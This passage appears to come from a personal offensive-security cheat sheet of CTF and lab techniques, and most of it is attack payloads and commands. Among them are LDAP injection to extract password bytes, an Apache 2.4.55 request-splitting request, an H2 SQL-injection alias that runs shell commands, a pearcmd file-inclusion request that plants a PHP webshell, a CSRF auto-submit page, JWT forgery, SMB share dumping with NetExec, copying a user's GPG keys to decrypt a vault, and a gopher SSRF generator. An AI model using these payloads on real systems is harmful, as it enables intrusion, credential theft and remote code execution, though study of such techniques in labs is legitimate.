	if flag.endswith("}"):
		print(f"[+] Flag is {flag}")
		break
```

- Result-:

![image](https://github.com/user-attachments/assets/0aea5991-c478-49d1-8f7b-69db2958a4e1)


- Exfiltrating field `userPassword`-:
  - userPassword attribute is not a string like the cn attribute for example but it’s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).

```ldap
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

-----------------------

### Request Splitting in Apache 2.4.55[Willy Wonka[BYUCTF]]

-----------------------

- Response splitting occurs in the apache version due to `REWRITE RULE` used in the version.

```conf
RewriteEngine on
    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
    ProxyPassReverse "/name/" "http://backend:3000/"
```

- Solution-:

```request
GET /name/a%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0aGET%20/ HTTP/1.1
Host: wonka.chal.cyberjousting.com
```

- Flag-:


![image](https://github.com/user-attachments/assets/529c18e0-4860-48a5-b892-35b032f32131)

--------------------

### Reference:

----------------------

- [Dhmosfunk](https://github.com/dhmosfunk/CVE-2023-25690-POC)

------------------------

### Exploiting Whtmltopdf

------------------------

- Set up a php server hosting this code as index.php-:

```
<?php header('location:file://'.$_REQUEST['x']); ?>
```

- Also, create an index.html to load index.php as an iframe.

```html
<iframe src=http://<ip>/test.php?x=/etc/passwd width=1000px height=1000px></iframe>
```

- Url should be-: <urll>/index.html

- Result-:

![image](https://github.com/user-attachments/assets/e6f56e17-9c7b-4276-8c35-cfba104f1f89)

---------------

### NETXEC

-----------------

- Install it with `pipx`-:

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```
- SMB enumeration with-:

```bash
nxc smb ./[host_file_name]
```
![image](https://github.com/user-attachments/assets/9cc4dfdc-5e59-4b43-b142-c98ca6c12ee6)

- Trying null logon with netexec

```bash
nxc smb ./hosts.txt -u '' -p '' --shares
```

![image](https://github.com/user-attachments/assets/36416101-1997-49f0-a1c9-5c4dc3cad2c8)

- Testing anonymous and guest login, to run guest enum, change `anonymous` to `guest`

```bash
nxc smb ./hosts.txt -u 'anonymous' -p '' - shares
```
![image](https://github.com/user-attachments/assets/d40f4955-a6de-43e3-91dd-86cd77a5acb2)

- Dumping files(Module used(spider_plus))-:

```
nxc smb  -u 'anonymous' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

![image](https://github.com/user-attachments/assets/0dfcdf66-50e6-458b-b38d-f6b3a7ed76b1)

- Validate creds with-:

```bash
nxc smb ./hosts.txt -u "${TARGET_USERNAME}" -p "${TARGET_PASSWORD}"
```

-----------------

### Mounting `c:\` filesystem of a windows host on wsl

-----------------

- Use if you are root on wsl

```bash
mount -f drvfs 'c:' /mnt/dir
```

-----------------

### Decrypting GPG  in your target machine

-----------------

- Use-:

```bash
cp -r /home/hish/.gnupg /tmp/gnupg-hish
chmod -R 700 /tmp/gnupg-hish
export GNUPGHOME=/tmp/gnupg-hish
gpg --list-secret-keys --keyid-format LONG
gpg --decrypt /home/hish/backup/keyvault.gpg
```

![image](https://github.com/user-attachments/assets/e5a7a15e-e592-4802-9efa-865643e74195)

-----------------------

### Cracking bcrypt with hashacat

----------------------

- Use-:

```bash
hashcat -a 0 -m 3200 (hash) (wordlist)
```

----------------------

### Fuzzing php extensions

---------------------

- [Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)

---------------------

### Reading more than a single line with latex injection

---------------------

- /verbatiminput-:

```latex
\documentclass{article}
\usepackage{verbatim}

\begin{document}

\verbatiminput{/challenge/app-script/ch23/.passwd}

\end{document}
}
```

-----------------------

### H2 db sqlinjection to rce 

-----------------------

- Payload to create a function without `$$` or `concat`-:

```java
SQL Injection';CREATE ALIAS exec_cmd1 AS 'String shellme(String cmd) throws java.io.IOException {
     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
     return s.hasNext() ? s.next() : "";}'--
```

- RCE-:

![image](https://github.com/user-attachments/assets/766dbd42-c6d7-4423-91aa-4415ff077819)

----------------------

### Reference

-----------------------

- [H2 Alias docs](https://www.h2database.com/html/commands.html#create_alias)

------------------------

### Exploiting JWT Algorithm Confusion

------------------------

- Building cookies with `rsa_sign` docker tool

```
docker build . -t sig2n
docker run -it sig2n /bin/bash
python3 jwt_forgery.py ey.... ey....
```

- Dockerfile edit, I added vim for cookie edit-:

```
FROM ubuntu:20.04

RUN apt update && apt install -y python3.8 python3-pip python3-gmpy2 libgmp-dev vim libmpfr-dev libmpc-dev && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY . .

RUN pip3 install -r requirements.txt
```

- Using it as a module-:


----------------------------

### Submitting Json for CSRF

----------------------------

- Poc-:

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5e002c03f4803d8cf0f98a009b00ea.web-security-academy.net/graphql/v1" method="POST" enctype="text/plain">
      <input type="hidden" name="query" value='mutation { changeEmail(input: { email: "wiener@normal-user.net" }) { email } }' />
      <input type="submit" id="send">
    </form>
    <script>
     document.getElementById("send").click();
    </script>
  </body>
</html>
```

------------------------

### Recreating Js Map file

-----------------------

- Use [SourceMapper](https://github.com/denandz/sourcemapper)
- Syntax-:

```bash
./sourcemapper -output dhubsrc -url []
```

------------------------

### Pearcmd RCE

-------------------------

- Source:[Tower of Hanoi CTF]
- In a situation where you can read only php files but you cannot upload.e.g

```php
<?php
session_start();

if (isset($_GET['lang'])) {
  $lang = $_GET['lang'];
  // we don't trust the GET parameter, comes from the user
  if ($lang != 'en' && $lang != 'it') {
    // default if lang is not valid, is italian
    $lang = 'it';
  }
  // Register the session and set the cookie
  $_SESSION['lang'] = $lang;
  setcookie('lang', $lang, time() + (3600 * 24 * 30));
} else if (isset($_SESSION['lang'])) {
  $lang = $_SESSION['lang'];
} else if (isset($_COOKIE['lang'])) {
  // cookie is safe, we set it ourself
  $lang = $_COOKIE['lang'];
} else {
  // default language is browser language
  $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
  if ($lang != 'en' && $lang != 'it') {
    // default if browser is not valid, is italian
    $lang = 'it';
  }
}

// include the language file
include 'lang/' . $lang . '.php';
?>
```

- The file inclusion point is $_COOKIE["lang"],I read `./../../../usr/local/lib/php/pearcmd` which worked.

<img width="1131" height="304" alt="image" src="https://github.com/user-attachments/assets/fea38cff-cdca-4941-aea2-f3a5034074d9" />

- The main problem is due to `register_argc_argv` turned on in `Docker-php` which allows query string to be passed as cli.Pear's `config-create` will be used to exploit it.It is specified in RFC3875 that if the query-string does not contain no encoding = , and the request is GET or HEAD, query-string needs to be used as a command line parameter.



```http
GET /index.php?+config-create+/<?=system($_GET['cmd']);?>+/tmp/hello.php HTTP/1.1
Host: 172.17.0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Cookie: lang=../../../../usr/local/lib/php/pearcmd
Connection: close
```

- The payload with write the shell php code to `/tmp/hello.php` which we'll later include to gain RCE.RCE


<img width="1078" height="417" alt="image" src="https://github.com/user-attachments/assets/d95bb74a-febd-4d7b-81bb-92fb3045914f" />

-------------------

### References

--------------------

- [PHITHON](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)
- [Mr-Xn](https://github.com/Mr-xn/thinkphp_lang_RCE)

--------------------

### HTTP req with gopher for curl

-------------------

- Script-:

```python
import string
import requests

raw_post_request = f""""""
FULL = raw_post_request.encode().hex()
payload = ""
for c in range(0,len(FULL),2):
    ch = chr(int(FULL[c:c+2],16))
    payload += ch if ch in string.ascii_lowercase+string.ascii_uppercase+string.digits else f"%{FULL[c:c+2]}"
gopher_url = f"gopher://localhost:8080/_{payload}"
print(gopher_url)
```

------------------
